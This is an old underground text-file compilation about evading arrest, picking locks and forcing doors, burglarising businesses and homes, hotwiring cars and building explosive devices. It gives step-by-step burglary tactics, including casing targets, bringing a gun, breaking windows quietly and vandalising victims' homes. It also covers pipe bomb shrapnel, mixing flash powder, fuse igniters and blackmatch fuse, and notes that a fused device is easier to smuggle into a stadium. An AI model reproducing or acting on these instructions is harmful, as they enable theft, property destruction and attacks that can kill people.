


                            Your Legal Rights



Because you possess this little collection of mostly illegal concepts, you
should be aware of your legal rights IF arrested (hey, it happens to the
worst of us).

  Your Legal Rights are::


1)  Have a hearing before a magistrate or judge, as soon as possible after 
you are arrested.
2)  Be notified of the charges against you.
3)  Have a reasonable bail set, if bail is granted.
4)  Have a FAIR, IMPARTIAL trial by jury.
5)  Be present at all stages of the trial.
6)  Confront your accusers.  (without the baseball bat)
7)  Have your lawyer cross-examine the witnesses.
8)  Have your lawyer call on witnesses on your behalf.
9)  Be tried for a crime only once.
10) Receive neither cruel nor unusual punishment if you are convicted of a 
crime and sentenced.


NOTE!!!: These rights are for after you are arrested, and do not include the 
reading of the rights, etc.  If these rights are violated in ANY way, that may
be cause for a mistrial, or even total release.

                    How The Law Protects Juvenile Offenders
                            (or tries to, anyway)





Juveniles accused of breaking the law are granted some special rights intended 
to protect them, because of their age.  If a juvenile is charged with a crime 
punishable by a term in a reform school or juvenile detention facility, he is 
assured the right to:


1)  Remain silent, and not incriminate himself/herself.
2)  Be placed in quarters seperate from adult offenders while being held in
custody.
3)  Be notified before a hearing of the charges against him.
4)  Be released to his parents or guardians after signing a written promise to
appear at his trial (unless the child is likely to run away and not come back
to court unless he is dangerous or may himself be in danger if sent back home).
5)  Be tried at proceedings that are closed to the public.
6)  Have a record of the proceedings made, in case one is needed for a future 
appeal.
7)  Be represented by a lawyer.
8)  Have a lawyer appointed by the court if he cannot afford one.
9)  Confront his accusers.
10) Have his lawyer cross-examine witnesses.


Again, these rights are for after you have been arrested.

Picking Master Locks                            by The Jolly Roger

Have you ever tried to impress someone by picking one of those 
Master combination locks and failed?

The Master lock company made their older combination locks with a 
protection scheme.  If you pull the handle too hard, the knob will 
not turn.  That was their biggest mistake.

The first number:

Get out any of the Master locks so you know what is going on.  
While pulling on the clasp (part that springs open when you get 
the combination right), turn the knob to the left until it will 
not move any more, and add five to the number you reach.  You now 
have the first number of the combination.

The second number:

Spin the dial around a couple of times, then go to the first 
number you got.  Turn the dial to the right, bypassing the first 
number once.  When you have bypassed the first number, start 
pulling on the clasp and turning the knob.  The knob will 
eventually fall into the groove and lock.  While in the groove, 
pull the clasp and turn the knob.  If the knob is loose, go to the 
next groove, if the knob is stiff, you have the second number of 
the combination.

The third number:

After getting the second number, spin the dial, then enter the two 
numbers.  Slowly spin the dial to the right, and at each number, 
pull on the clasp.  The lock will eventually open if you did the 
process right.  

This method of opening Master locks only works on older models.  
Someone informed Master of their mistake, and they employed a new 
mechanism that is foolproof (for now).

The older models are from 1988-1990.  The newer models are being
cracked on as we speak..

The Arts of Lockpicking I              courtesy of The Jolly Roger

Lockpicking I:  Cars and assorted other locks

While the basic themes of lockpicking and uninvited entry have not 
changed much in the last few years, some modern devices and 
techniques have appeared on the scene.

Automobiles:

Many older automobiles can still be opened with a Slim Jim type of 
opener (these and other auto locksmithing techniques are covered 
fully in the book "In the Still of the Night", by John Russell    
III);  however, many car manufacturers have built cases over the 
lock mechanism, or have moved the lock mechanism so the Slim Jim 
will not work.  So:

American Locksmith Service
P.O. Box 26
Culver City, CA  90230

ALS offers a new and improved Slim Jim that is 30 inches long and
3/4 inches wide, so it will both reach and slip through the new 
car lock covers (inside the door).  Price is $5.75 plus $2.00 
postage and handling.

Cars manufactured by General Motors have always been a bane to 
people who needed to open them, because the sidebar locking unit 
they employ is very difficult to pick.  To further complicate 
matters, the new GM cars employ metal shields to make the use of a
Slim Jim type instrument very difficult.  So:

Lock Technology Corporation
685 Main St.
New Rochelle, NY  10801

LTC offers a cute little tool which will easily remove the lock 
cylinder without harm to the vehicle, and will allow you to enter 
and/or start the vehicle.  The GMC-40 sells for $56.00 plus $2.00 
for postage and handling.

The best general automobile opening kit is probably a set of 
lockout tools offered by:

Steck MFG Corporation
1319 W. Stewart St.
Dayton, OH  45408

For $29.95 one can purchase a complete set of six carbon lockout
tools that will open more than 95% of all the cars around.

Kwickset locks have become quite popular as one step security 
locks for many types of buildings.  They are a bit harder to pick 
and offer a higher degree of security than a normal builder 
installed door lock.  So:

A MFG
1151 Wallace St.
Massilon, OH  44646

Price is $11.95.  Kwickset locks can handily be disassembled and 
the door opened without harm to either the lock or the door by 
using the above mentioned Kwick Out tool.

If you are too lazy to pick auto locks:

Veehof Supply
Box 361
Storm Lake, IO  50588

VS sells tryout keys for most cars (tryout keys are used since 
there is no one master key for any one make of car, but there are 
group type masters (a.k.a. tryout keys).  Prices average about 
$20.00 a set.

Updated Lockpicking:

For years, there have been a number of pick attack procedures for 
most pin and tumbler lock systems.  In reverse order of ease they 
are as follows:

Normal Picking:  Using a pick set to align the pins, one by one, 
                 until the shear line is set and the lock opens.

Racking:  This method uses picks that are constructed with a 
          series of bumps, or diamond shape notches.  These picks
          are "raked" (i.e. run over all the pins at one time).  
          With luck, the pins will raise in the open position and
          stay there.  Raking, if successful, can be much less of
          an effort than standard picking.

Lock Aid Gun:  This gun shaped device was invented a number of 
               years ago and has found application with many 
               locksmiths and security personnel.  Basically, a 
               needle shaped pick is inserted in the snout of the
               "gun", and the "trigger" is pulled.  This action 
               snaps the pick up and down strongly.  If the tip is
               slipped under the pins, they will also be snapped 
               up and down strongly.  With a bit of luck they will
               strike each other and separate at the shear line 
               for a split second.  When this happens the lock 
               will open.  The lock aid gun is not 100% 
               successful, but when it does work, the results are 
               very dramatic.  You can sometimes open the lock 
               with one snap of the trigger.

Vibrator:  Some crafty people have mounted a needle pick into an 
           electric toothbrush power unit.  This vibrating effect
           will sometimes open pin tumbler locks -- instantly.

There is now another method to open pin and wafer locks in a very
short time.  Although it resembles a toothbrush pick in 
appearance, it is actually an electronic device.  I am speaking of
the Cobra pick that is designed and sold by:

Fed Corporation
P.O. Box 569
Scottsdale, AR  85252

The Cobra uses two nine volt batteries, teflon bearings (for less
noise), and a cam roller.  It comes with three picks (for 
different types of locks) and works both in America and overseas,
on pin or wafer locks.  The Cobra will open group one locks 
(common door locks) in three to seven seconds with no damage, in 
the hands of an experienced locksmith.  It can take a few seconds
more or up to a half a minute for someone with no experience at 
all.  It will also open group two locks (including government, 
high security, and medecos), although this can take a short time 
longer.  It will not open GM sidear locks, although a device is
about to be introduced to fill that gap.  How much for this toy 
that will open most locks in seven seconds?

$235.00 plus $4.00 shipping and handling.

For you hard core safe crackers, FC also sells the MI-6 that will 
open most safes at a cost of $10,000 for the three wheel attack 
model, and $10,500 for the four wheel model.  It comes in a sturdy
aluminum carrying case with monitor, disk drive and software.

If none of these safe and sane ideas appeal to you, you can always
fall back on the magic thermal lance...

The thermal lance is a rather crude instrument constructed from 
3/8 inch hollow magnesium rods.  Each tube comes in a 10 foot 
length, but can be cut down if desired.  Each one is threaded on 
one end.  To use the lance, you screw the tube together with a 
matted regulator (like a welding outfit uses) and hook up an 
oxygen tank.  Then oxygen is turned on and the rod is lit with a 
standard welding ignitor.  The device produces an incredible 
amount of heat.  It is used for cutting up concrete blocks or even
rocks.  An active lance will go through a foot of steel in a few 
seconds.  The lance is also known as a burning bar, and is 
available from:

C.O.L. MFG
7748 W. Addison

So you want to be a criminal.  Well, if you want to be like James 
Bond and open a lock in fifteen seconds, then go to Hollywood, 
because that is the only place you are ever going to do it.  Even 
experienced locksmiths can spend five to ten minutes on a lock if
they are unlucky.  If you are wanting extremely quick access, look
elsewhere.  The following instructions will pertain mostly to the
"lock in knob" type lock, since it is the easiest to pick.

First of all, you need a pick set.  If you know a locksmith, get 
him to make you a set.  This will be the best possible set for you
to use.  If you find a locksmith unwilling to supply a set, don't 
give up hope.  It is possible to make your own, if you have access
to a grinder (you can use a file, but it takes forever).

The thing you need is an allen wrench set (very small).  These 
should be small enough to fit into the keyhole slot.  Now, bend 
the long end of the allen wrench at a slight angle (not 90  
degrees).  Now, take your pick to a grinder or a file, and smooth 
the end until it is rounded so it won't hang inside the lock.  
Test your tool out on doorknobs at your house to see if it will 
slide in and out smoothly.  Now, this is where the screwdriver 
comes in.  It must be small enough for it and your pick to be used
in the same lock at the same time, one above the other.  In the 
coming instructions, please refer to this chart of the interior of
a lock:
______________________________
                              \ K
        |  |  |  |   |   |    / E
           |     |   |   |    \ Y           [|]  Upper tumbler pin
        ^     ^               / H           [^]  Lower tumbler pin
        ^  ^  ^  ^   ^   ^    \ O           [-]  Cylinder wall
                              / L   (This is a greatly simplified
                              \ E    drawing)
______________________________/

The object is to press the pin up so that the space between the 
upper pin and the lower pin is level with the cylinder wall.  Now,
if you push a pin up, it's tendency is to fall back down, right?
That is where the screwdriver comes in.  Insert the screwdriver 
into the slot and turn.  This tension will keep the "solved" pins
from falling back down.  Now, work from the back of the lock to 
the front, and when you are through, there will be a click, the
screwdriver will turn freely, and the door will open.

Do not get discouraged on your first try!  It will probably take 
you about twenty to thirty minutes your first time.  After that,
you will quickly improve with practice.

                              LOCKPICKING 3

     If it becomes necessary to pick a lock to enter a lab, the world's most
effective lockpick is dynamite, followed by a sledgehammer.  There are
unfortunately, problems with noise and excess structural damage with these
methods. The next best thing, however, is a set of professional lockpicks.

These, unfortunately, are difficult to acquire. If the door to a lab is locked,
but the deadbolt is not engaged, then there are other possibilities. The rule
here is: if one can see the latch, one can open the door. There are several
devices which facilitate freeing the latch from its hole in the wall. Dental
tools, stiff wire ( 20 gauge ), specially bent aluminum from cans, thin
pocket knives, and credit cards are the tools of the trade. The way that all
these tools and devices are uses is similar: pull, push, or otherwise move the
latch out of its recess in the wall, thus allowing the door to open. This is
done by sliding whatever tool that you are using behind the latch, and forcing
the latch back into the door.

Most modern doorknob locks have two fingers. The larger finger holds the door
closed while the second (smaller) finger only prevents the first finger from
being pressed in when it (the second finger) is pressed in by the catchplate
of the door.  If you can separate the catch plate and the lock sufficiently
far, the second finger will slip out enough to permit the first finger to be
slipped.

   Small   ->   (|   }   <--- The large (first) finger
   second        |___}   <
   finger

Some methods for getting through locked doors are:

  1) Another method of forced entry is to use an automobile jack to force the
     frame around the door out of shape, freeing the latch or exposing it to
     the above methods. This is possible because most door frames are designed
     with a slight amount of "give". Simply put the jack into position
     horizontally across the frame in the vicinity of the latch, and jack it
     out. If the frame is wood it may be possible to remove the jack after
     shutting the door, which will relock the door and leave few signs of
     forced entry. This technique will not work in concrete block buildings,
     and it's difficult to justify an auto jack to the security guards.
  2) use a screwdriver or two to pry the lock and door apart.  While holding
     them apart, try to slip the lock.  Screwdrivers, while not entirely
     innocent, are much more subtle than auto jacks, and much faster if they
     work.  If you're into unsubtle, I suppose a crowbar would work too, but
     then why bother to slip the lock at all?
  3) Find a set of double doors.  They are particularly easy to pry apart far
     enough to slip.
  4) If the lock is occasionally accessible to you while open, "adjust" or
     replace the catchplate to make it operate more suitably (i.e., work so
     that it lets *both* fingers out, so that it can always be slipped).  If
     you want, disassembling the lock and removing some of the pins can make
     it much easier to pick.
  5) If, for some odd reason, the hinges are on your side (i.e., the door
     opens outward), remove the hinge pins (provided they aren't stopped with
     welded tabs).  Unfortunately, this too lacks subtlety, in spite of its
     effectiveness.
  6) If the door cannot be slipped and you will want to get through regularly,
     break the mechanism.  Use of sufficient force to make the first finger
     retreat while the second finger is retreated will break some locks (e.g.,
     Best locks) in such a way that they may thereafter be slipped trivially,
     yet otherwise work in all normal ways.  Use of a hammer and/or
     screwdriver is recommended. Some care should be used not to damage the
     door jamb when attempting this on closed and locked doors, so as not to
     attract the attention of the users/owners/locksmith/police/....
  7) Look around in desks.  People very often leave keys to sensitive things
     in them or other obvious places.  Especially keys to shared critical
     resources, like supply rooms, that are typically key-limited but that
     everyone needs access to.  Take measurements with a micrometer, or make a
     tracing (lay key under paper and scribble on top), or be dull and make a
     wax impression.  Get blanks for the key type (can be very difficult for
     better locks; I won't go into methods, other than to say that if you can
     get other keys made from the same blank, you can often work wonders with
     a little ingenuity) and use a file to reproduce the key.  Using a
     micrometer works best:  keys made from mic measurements are more likely
     to work consistently than keys made by any other method.  If you us
     tracings, it is likely to take many tries before you obtain a key that
     works reliably.  Also, if you can 'borrow' the cylinder and disassemble
     it, pin levels can be obtained and keys constructed.
  8) Simple locks, like desks, can be picked fairly easily.  Many desks have
     simple three or four pin locks of only a few levels, and can be
     consistently picked by a patient person in a few minutes.  A small
     screwdriver and a paper clip will work wonders in practiced hands.  Apply
     a slight torque to the lock in the direction of opening with the
     screwdriver.  Then 'rake' the pins with the unfolded paper clip.  With
     practice, you'll apply enough pressure with the screwdriver that the pins
     will align properly (they'll catch on the cylinder somewhere between the
     top and bottom of their normal travel), and once they're all lined up,
     additional pressure on the screwdriver will then open the lock.  This, in
     conjunction with (7) can be very effective.  This works better with older
     or sloppily machined locks that have a fair amount of play in the
     cylinder.  Even older quality locks can be picked in this manner, if
     their cylinders have been worn enough to give enough play to allow pins
     to catch reliably. Even with a well worn quality lock, though, it
     generally takes a *lot* of patience.
  9) Custodial services often open up everything in sight and then take
     breaks.  Make the most of your opportunities.
 10) No matter what you're doing, look like you belong there.  Nothing makes
     anyone more suspicious than someone skulking about, obviously trying to
     look inconspicuous.  If there are several of you, have some innocuous and
     normal seeming warning method ("Hey, dummy!  What time is it?") so that
     they can get anything suspicious put away.  Don't travel in large groups
     at 3 AM.  Remember, more than one car thief has managed to enlist a cop's
     aid in breaking into a car.  Remember this.  Security people usually
     *like* to help people.  Don't make them suspicious or annoy them.  If you
     do run into security people, try to make sure that there won't be any
     theft or break-ins reported there the next day...
 11) Consider the possibilities of master keys.  Often, every lock in a
     building or department will have a common master (building entrance keys
     are a common exception).  Take apart some locks from different places
     that should have common masters, measure the different pin lengths in
     each, and find lengths in common.  Experiment.  Then get into those
     places you're *really* curious about.
 12) Control keys are fun, too.  These keys allow the user to remove the
     lock's core, and are generally masters.  (A pair of needle nose pliers or
     similar tool can then be used to open the lock, if desired.)


                           SLIPPING A LOCK

     The best material we've found for slips so far is soft sheet copper.  It
is quite flexible, so it can be worked into jambs easily, and can be pre-bent
as needed.  In the plane of the sheet, however, it is fairly strong, and pulls
nicely.  Of course, if they're flexible enough, credit cards, student IDs,
etc., work just fine on locks that have been made slippable if the door jamb
is wide enough.  Wonderfully subtle, quick, and delightfully effective.  Don't
leave home without one.

 (Ill. #1)

The sheet should then be folded to produce an L,J,or U shaped device that
looks like this:

We hasten to add here that many or most colleges and universities
have very strict policies about unauthorized possession of keys.  At
most, it is at least grounds for expulsion, even without filing criminal
charges.  Don't get caught with keys!!!  The homemade ones are
particularly obvious, as they don't have the usual stamps and marks
that the locksmiths put on to name and number the keys.]

we should also point out that if you make a nuisance of yourself, there are
various nasty things that can be done to catch you and/or slow you down.  For
instance, by putting special pin mechanisms in, locks can be made to trap any
key used to open them.  If you lose one this way, what can I say?  At least
don't leave fingerprints on it.  Or make sure they're someone else's.  Too
much mischief can also tempt the powers that be to rekey.

                             OPENING COMBO LOCKS

[ Touched up by V.T - The Editor ]

    First of all, let me tell you about the set-up of a lock.  When the lock
is locked, there is a curved piece of metal wedged inside the little notch on
the horseshoe shaped bar (known as the shackle) that is pushed in to the lock
when you lock it.

     To free this wedge, you usually have to turn the lock to the desired
combination and the pressure on the wedge is released therefore letting the
lock open.  I will now tell you how to make a pick so you can open a lock
without having to waste all that time turning the combination (this also helps
when you don't know the combination to begin with).

        To bypass this hassle, simply take a thinned hairpin (file it down) or
a opened out piece of a collapsing antenna (the inside diameter of the curved
piece of metal should be the same as the diameter of the shackle- if the metal
is too thick, use fine sandpaper to thin it down.

    Once you have your hair pin (make sure it's metal), take the ridged side
and break it off right before it starts to make a U-turn onto the straight
side.  The curved part  can now be used as a handle. Now, using a file, file
down the other end until it is fairly thin.  You should do this to many
hairpins and file them so they are of different thicknesses so you can jimmy
various locks.

  Look at a lock to see which side the lock opens from.  If you can't tell,
you will just have to try both sides.  When ya find out what side it opens
from, , take the lock pick and stick the filed end into the inside of the
horseshoe-shaped bar on whichever side the lock opens from.

     Now, put pressure on the handle of the lock pick (pushing down, into the
crack) and pull the lock up and down.  The lock will then open because the
pick separated the wedge and the notch allowing it to open.

  Also, this technique works best on American locks.  I have never picked a
Master lock before because of the shape a pressure of the wedge but if anyone
does it, let me know how long it took. Also, the Master lock casing is very
tight so ya can't get the shim in.

This is really a good method for opening doors that are locked.  The
only problem with this, though, is that it only works for outward
opening doors.  Ok, here we go....

1)  Realize you are not working with the actual lock, but that thing
    that sticks between the door and the wall.

2)  See how that thing is curved on one side?  Well, that is what we
    will be making use of.

3)  Acquire a large paper-clip.  If it is too short, it won't work.
    You have to also have a shoelace.  Now, onto the construction...

4)  Straighten the paper-clip.

5)  Loop one end of the paper clip around the shoelace.  The shoelace
    should be about 4/5 on one side of the clip and 1/5 on the other.
    Let's see if I can draw it.
                         
       ------------------*************************************
                        -*
                          *******


       --- is the paper clip
       *** is the shoelace

     That's not very good, but I hope you get the picture.

6)  All you have to do now is curve the paper clip (no, I won't draw it)

7)  With the curved paper-clip, stick it between the door and the wall,
    behind the metal thing that sticks between. 

8)  Feed it through with you hand, until you can grip both sides of the
    shoelace.

9)  Now, simply pull the lace and the door at the same time, and VIOLA!
    the door is open.

I prefer this over regular lock-picking if the door opens outward, because
it is a lot quicker.  Lock picking can take 5 minutes... When done correctly
this only takes 30 seconds!  So, if you can, use this.

It is strange just how many files there are out there that try to 
document the art of stealing.  After all, it IS an art.  You have to 
be calm, smooth, persistant, patient.  Stealing is not an overnight- 
planned operation.  You should try to prepare for at least a week or 
more when planning to steal from a house, and even LONGER when from 
a business.  Storytime, kiddies:

    A long time ago, well, in the past year, my friends and I 
noticed that the building complex in our town was the perfect place 
to obtain unpaid-for items.  We learned all we could about the 
complex, which was about 365,000 sqft, and each company consisted of 
an office (fully furnished with cool computer stuff), and a 10,000 
sqft (roughly) warehouse, all interconnected, and all one level.  
This information was obtained through several calls to the town 
committee (board of development, or some shit like that, the place 
that you call for building permits, and the like.), and we obtained 
the blueprints for the whole complex.  We planned a route from the 
side entrance through the warehouse, and into the offices, where all 
the good stuff is usually located.  Now that we had our route, all 
we needed was a plan to get inside.  Since this was our first major 
job, we spent a few good weeks on preparation.  During the snow 
weather, we worked w/ a company to shovel the sidewalks of the 
complex.  One night, at about 11 pm, we stopped shoveling in front 
of our planned job site, Campbells Soup, Co.  There was nobody there 
except the janitors that cleaned up the place (or so we thought).  I 
asked the janitor if I could use the bathroom (I did have to go too) 
and he let me in.  I must have surprised him when I knew exactly 
where the bathroom was!  As I walked to it, I scanned for vid cams, 
infrared guns/recievers (little boxes at entrances with a black 
glass square about 1" sq. at about knee hight on each side).   
Nothing.  The doors all had security magnetic detection at the tops, 
and also the windows.  To think someone would break in through an 
obvious place like a large window, stupid.  To my surprise, there 
were a few losers working late, and didn't really care that I was 
there at all.  Take another Viverin' guys, I wont be here long.  The 
smell of black coffee was stifeling.  The bathroom was located back 
by the office's entrance to the warehouse, and to my surprise, it 
was unlocked!  The lights were on, and the place was totally empty, 
except for a few cardboard remains, and shelves, and that blessed 
side door.  I walked over to the door to examine it.  No security, 
no vid cams in the warehouse, no nothing.  Odd, usually these 
warehouses were kept tight as a hookers pussy.  But it looked like 
they were packing up to move somewhere.  Boxes on the office desks, 
etc..  The door was locked with a key deadbolt (pain to pick) and a 
regular door-knob key lock.  No problem.  I needed to stop that 
deadbolt from being locked, so I looked around for something to 
use....aha!  There was some strange material like alum. foil on the 
ground, pliable, yet of a black color.  I took out a small allen key 
(a thief never goes ANYWHERE without a small lockpicking tool) and 
crammed enough of the stuff into the keyhole so that a key could not 
be inserted far enough to turn, and the stuff was inn to far to be 
pulled out.  Viola!  Back to the point of this story.  When the time 
came to make our move, something strange happened.  The place was 
abandoned for 3 days straight, most office equipment removed, and 
the front door left ajar, for all 3 days.  We still decided to enter 
via our planned route.  At 1:30am we went to the side door, and what 
a surprise, the deadbolt lock was open.  Now to the knob lock.  It 
was still locked, but not a problem.  Knob locks usually look like 
this:


                       |-wall socket>
     --------------------------
                       |       )
 d   -------------------------------|
 o                     |            |

 r                     |         )
                       |       )
     -------------------------
                       |
                       |-wall socket>

The top sliding piece is about 1/4" wide on popular locks, with the 
bar facing you, if the door swings outward.  With the smallest 
allenkey you can get, stick it in and repeatively push and slide it 
back towards the knob, but don't let go, because it is spring loaded 
and will snap back into place again.  Now for the larger bar.  Take 
another key and wedge it into the slot where the bar enters the 
other wall (without the knob on it)! and do the same thing.  This 
will be considerably harder to do than with the small tongue, but if 
you practiced like you should have, it will open with minimum effort.
Now we were inside.  We ran through the warehouse thruogh the 
warehouse/office door (these are rarely locked, but try to prepare 
for it ahead of time by "cramming the lock" like I did) and into the 
office.  The place was empty, no shelves, just desks, chairs, and 
boxes.  The boxes contained modems, motherboards, bus cards, 
printers, cables, fone cable, and one contained a Zenith laptop 
computer!  No shit, this is a true story!  We took everything we 
could carry (5 people).  We took all the above mentioned, as well as 
printer toner, fones, fone jacks, documents, desk chairs, insulated 
boxes and bags (static-free kind), even the little shit things, like 
outlet plates, light bulbs, ANYTHING!!!  We went really crazy, and 
were out in 2 min 30 sec.(always set a time limit) 
    We wound up throwing half the shit away, but it felt great just 
to take anything that was not ours!! I have since then done other 
"jobs" with much more precision, and effort, as well as better 
rewards.  Here are some tips that should be followed when attempting 
to steal::


-WEAR GLOVES!!!!!!!!!!

-backpacks for everyone to put the loot in

-always case the joint for at least a week and keep documented 
records of who leaves when, what time it closes, timed lights, etc...

-have at least 4 phriends with you, and ,please, make sure they know 
what they are doing, no idiots allowed!

-bring tools :small allen keys, both types of screwdrivers, standard 
size, and tiny, hacksaw blade, wire cutters and strippers, 
spraypaint-to leave your handle on the wall, hammer, mace, gun-if 
available, flashlights (duh), wire-good for re-routing door 
security, and bolt cutters.

-designate a person to carry all the tools ONLY-don't have him 
pickup stuff and mix it with the tools, this will only slow you down 
later if you need to look for a tool quickly.

-designate a person to STAY PUT by the door and keep watch.

-designate a timer, one who has a lighted stopwatch.

-make runs NO LONGER THAT 3 MIN.  EVEN THIS TIME IS EXTREEMELY 
HIGH-TRY TO KEEP AS LOW AS POSSIBLE.

-getaway vehicle (preferably NOT a van or pickup truck, these will  
be very suspicious to the pigs..er.I mean cops.  And don't speed, or 
anything, this just attracts attention.  Cover licence plates till 
just before you get your asses going, so no one can report the 
plates to the pigs..oops!, damn, did it again, cops.  Make sure you 
remove covering before leaving.

-Always keep flashlights pointed DOWN unless necessary, crawl under 
windows, no shouting, even if you find some phucking cool shit, on 
second thought, maybe painting your handle is a little stupid, so 
forget that, wear dark clothes OVER regular, non-suspicious clothes 
(get changed first thing in the car)

-Never brag about your findings in public, only on modem, or on BBS, 
and never give names of places, phriends, and exact names of things 
taken, (just say you 'borrowed' a 486DX 33 motherboard, don't say is 
a Intel 486DX 33 mhz for an IBM PS/1 model 50, serial 
#XXXXXXXXXXXX.  that is just plain dumb)

-Have phunn!! and never steal from your neighborhood.  

-If you break into houses, never move stuff around; the longer it 
takes the yuppie family to realize that you were there, the better.

-WEAR GLOVES!!!!!!!!!!!!!

-to get in windows: shoot window with BB gun, and place clear, 
stickey hard-cover book covering on the window over the hole, 
hopefully the inpact of the shot was enough to crack the glass, and 
LEAN OR PUSH on the covered glass, do not hit or kick, and you will 
see that the majority of the glass will stick to the covering, and 
will make considerably less noise.

-enter through basement windows preferably under a deck or steps.

-MAKE SURE THE PEOPLE WILL BE GONE FOR THE NIGHT AND THE NEIGHBORS 
ARE ASLEEP (GO FOR AROUND 2:30 AM)

-take stuff that will sell easily to friends, and don't waste time 
taking things that look neat, just take the basics:  electronic, 
computer, TV, VCR, some jewelry-things you could easily hock, 
preferably without inscriptions, raid the fridge, take good quality 
fones, stereo equip., speakers, etc..

-always case the outside of the house looking for security stickers 
that yuppie families like to place in full view.

-do mischievous shit like cut all fone lines in house, cut up couch 
cushions, and flip them over so they look perfectly normal!; shoot a 
hole in their fish tank, (all yuppies own fish); slash clothes, then 
put them back into the drawer; unplug fridge; set thermostat way up 
to 99.9 degrees; leave drain plugged and let the faucet run just a 
little, (for 6 hours!!); whatever you can't take or carry out, 
destroy in a subtle way, -if you can't carry out those 130 lb wood 
case stereo speakers, slash the cones; break ballpoint pens open and 
rub them into the carpet with their shoes; run a magnet over audio 
and VCR cassettes and floppies, and anything else subtle that would 
brighten their day.

Get in the car. Look under the dash. If it enclosed, forget it 
unless you want to cut through it. If you do, do it near the 
ignition. Once you get behind or near the ignition look for two 
red wires. In older cars red was the standard color, if not, look 
for two matched pairs. When you find them, cross them and take 
off!

        An "own goal" is the death of a person on your side from one of
your own devices. It is obvious that these should be avoided at all
costs. While no safety device is 100% reliable, it is usually better to
err on the side of caution.

                           BASIC SAFETY RULES

1) DON'T SMOKE!  (don't laugh- an errant cigarette wiped out the Weathermen)
2) GRIND ALL INGREDIENTS SEPERATELY. It's suprising how friction sensitive
    some supposedly "safe" explosives really are.
3) ALLOW for a 20% margin of error- Just because the AVERAGE burning rate of a
    fuse is 30 secs/foot, don't depend on the 5 inches sticking out of your
    pipe bomb to take exactly 2.5 minutes.
4) OVERESTIMATE THE RANGE OF YOUR SHRAPNEL. The cap from a pipe bomb can
    often travel a block or more at high velocities before coming to rest- If
    you have to stay nearby, remember that if you can see it, it can kill you.
5) When mixing sensitive compounds (such as flash powder) avoid all sources of
   static electricity. Mix the ingredients by the method below:

                       HOW TO MIX INGREDIENTS 

     The best way to mix two dry chemicals to form an explosive is to do as
the small-scale fireworks manufacturer's do:

Ingredients:

1 large sheet of smooth paper (for example a page from a newspaper that does
    not use staples)

The dry chemicals needed for the desired compound.

1) Measure out the appropriate amounts of the two chemicals, and pour them in
    two small heaps near opposite corners of the sheet.
2) Pick up the sheet by the two corners near the powders, allowing the powders
    to  roll towards the middle of the sheet.
3) By raising one corner and then the other, roll the powders back and forth
    in the middle of the open sheet, taking care not to let the mixture spill
    from either of the loose ends.
4) Pour the powder off from the middle of the sheet, and use immediately. If
    it must be stored use airtight containers (35mm film canisters work
    nicely) and store away from people, houses, and valuable items.

  IGNITION DEVICES

     There are many ways to ignite explosive devices.  There is the classic
"light the fuse, throw the bomb, and run" approach, and there are sensitive
mercury switches, and many things in between.  Generally, electrical
detonation systems are safer than fuses, but there are times when fuses are
more appropriate than electrical systems; it is difficult to carry an
electrical detonation system into a stadium, for instance, without being
caught.  A device with a fuse or impact detonating fuze would be easier to
hide.

  FUSE IGNITION

     The oldest form of explosive ignition, fuses are perhaps the favorite
type of simple ignition system.  By simply placing a piece of waterproof fuse
in a device, one can have almost guaranteed ignition.  Modern waterproof fuse
is extremely reliable, burning at a rate of about 2.5 seconds to the inch.  It
is available as model rocketry fuse in most hobby shops, and costs about $3.00
for a nine-foot length.  Cannon Fuse is a popular ignition system for pipe
bombers because of its simplicity.  All that need be done is light it with a
match or lighter. Of course, if the Army had fuses like this, then the
grenade, which uses fuse ignition, would be very impracticle.  If a grenade
ignition system can be acquired, by all means, it is the most effective.  But,
since such things do not just float around, the next best thing is to prepare
a fuse system which does not require the use of a match or lighter, but still
retains its simplicity. One such method is described below:


     MATERIALS
     _________
     strike-on-cover type matches       electrical tape or duct tape
     waterproof fuse

1) To determine the burn rate of a particular type of fuse, simply measure a 6
   inch or longer piece of fuse and ignite it.  With a stopwatch, press the
   start button the at the instant when the fuse lights, and stop the watch
   when the fuse reaches its end.  Divide the time of burn by the length of
   fuse, and you have the burn rate of the fuse, in seconds per inch.  This
   will be shown below:

     Suppose an eight inch piece of fuse is burned, and its complete time of
    combustion is 20 seconds.

     20 seconds / 8 inches = 2.5 seconds per inch.

     If a delay of 10 seconds was desired with this fuse, divide the desired
     time by the number of seconds per inch:

     10 seconds / 2.5 seconds per inch  = 4 inches

NOTE: THE LENGTH OF FUSE HERE MEANS LENGTH OF FUSE TO THE POWDER.  SOME FUSE,
  AT LEAST AN INCH, SHOULD BE INSIDE THE DEVICE.  ALWAYS ADD THIS EXTRA INCH,
  AND PUT THIS EXTRA INCH AN INCH INTO THE DEVICE!!!

2) After deciding how long a delay is desired before the explosive device is
   to go off, add about 1/2 an inch to the premeasured amount of fuse, and cut
   it off.

3) Carefully remove the cardboard matches from the paper match case.  Do not
   pull off individual matches; keep all the matches attached to the cardboard
   base.  Take one of the cardboard match sections, and leave the other one to
   make a second igniter.

4) Wrap the matches around the end of the fuse, with the heads of the matches
   touching the very end of the fuse.  Tape them there securely, making sure
   not to put tape over the match heads.  Make sure they are very secure by
   pulling on them at the base of the assembly.  They should not be able to
   move.

5) Wrap the cover of the matches around the matches attached to the fuse,
   making sure that the striker paper is below the match heads and the striker
   faces the match heads.  Tape the paper so that is fairly tight around the
   matches. Do not tape the cover of the striker to the fuse or to the
   matches. Leave enough of the match book to pull on for ignition.

     The match book is wrapped around the matches, and is taped to itself.     
The matches are taped to the fuse.  The striker will rub against the     
matcheads when the match book is pulled.

6) When ready to use, simply pull on the match paper.  It should pull the
   striking paper across the match heads with enough friction to light them.
   In turn, the burning matcheads will light the fuse, since it adjacent to
   the burning match heads.


     HOW TO MAKE BLACKMATCH FUSE:
     ----------------------------

  Take a flat piece of plastic or metal (brass or aluminum are easy to work
with and won't rust).  Drill a 1/16th inch hole through it.  This is your die
for sizing the fuse.  You can make fuses as big as you want, but this is the
right size for the pipe bomb I will be getting to later.

   To about 1/2 cup of black powder add water to make a thin paste.  Add 1/2
teaspoon of corn starch. Cut some one foot lengths of cotton thread.  Use
cotton, not silk or thread made from synthetic fibers.  Put these together
until you have a thickness that fills the hole in the die but can be drawn
through very easily.

  Tie your bundle of threads together at one end. Separate the threads and
hold the bundle over the black powder mixture. Lower the threads with a
circular motion so they start curling onto the mixture.  Press them under with
the back of a teaspoon and continue lowering them so they coil into the paste.
Take the end you are holding and thread it through the die.  Pull it through
smoothly in one long motion.

  To dry your fuse, lay it on a piece of aluminum foil and bake it in your 250
degree oven or tie it to a grill in the oven and let it hang down.  The fuse
must be baked to make it stiff enough for the uses it will be put to later.
